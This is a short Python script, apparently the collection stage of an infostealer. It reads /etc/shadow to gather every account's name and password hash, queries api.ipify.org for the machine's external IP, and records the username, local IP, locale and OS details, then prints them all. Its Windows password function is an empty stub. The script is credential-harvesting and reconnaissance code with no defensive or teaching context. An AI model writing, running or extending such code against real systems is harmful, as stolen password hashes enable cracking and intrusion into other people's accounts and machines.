import requests
import getpass
import socket
import locale
import platform

def getLinuxPasswords():
    passwords =[]
    try:
        with open('/etc/shadow', 'r') as passwd_file:  # Assuming Linux-based system
            content = passwd_file.readlines()

        for line in content:
            lineInArray = line.split(":")
            if(lineInArray[1] != "*"):
                passwords.append({"user name": lineInArray[0], "encrypted password": lineInArray[1]})
    except Exception as e:
        passwords.append(e)
    
    return passwords

def getWindowsPasswords():
    passwords =[]
    return passwords

def get_details():
    # Current username
    current_username = getpass.getuser()

    # IP addresses
    ip_address = socket.gethostbyname(socket.gethostname())

    response = requests.get('https://api.ipify.org?format=json')
    data = response.json()
    external_ip = data['ip']

    # Available languages
    available_languages = locale.getlocale()

    # OS version
    os_version = platform.platform()

    #OS name
    os_name = platform.system()

    # Password file
    passwords = []   
    if os_name == "Linux":
        passwords = getLinuxPasswords()
    elif os_name == "Windows":
        passwords = getWindowsPasswords()
        

    # Print the details
    print("Password File:")
    for password in passwords:
        print(password)
    print("Current Username:", current_username)
    print("IP Address:", ip_address)
    print("External IP address:", external_ip)
    print("Available Languages:", available_languages)
    print("Operating System:", os_name)
    print("OS Version:", os_version)
    





